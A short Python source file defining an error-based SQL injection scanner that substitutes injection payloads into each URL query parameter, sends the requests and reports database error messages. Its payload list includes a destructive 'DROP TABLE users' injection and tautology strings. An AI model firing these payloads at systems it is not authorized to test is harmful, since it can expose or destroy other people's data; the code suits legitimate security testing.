import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SQLI_PAYLOADS = ["'", "1 OR 1=1", "1; DROP TABLE users--", "' OR '1'='1"]
ERROR_SIGNS = ["sql syntax", "mysql_fetch", "ora-", "sqlite", "syntax error", "unclosed quotation"]

class SQLiScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def scan(self):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        if not params:
            return []
        for param in params:
            for payload in SQLI_PAYLOADS:
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                try:
                    r = requests.get(test_url, timeout=3)
                    for sign in ERROR_SIGNS:
                        if sign in r.text.lower():
                            self.findings.append({
                                "type": "SQLi",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "error": sign
                            })
                            print(f"[!] SQLi found: {test_url} param={param}")
                            break
                except:
                    pass
        return self.findings
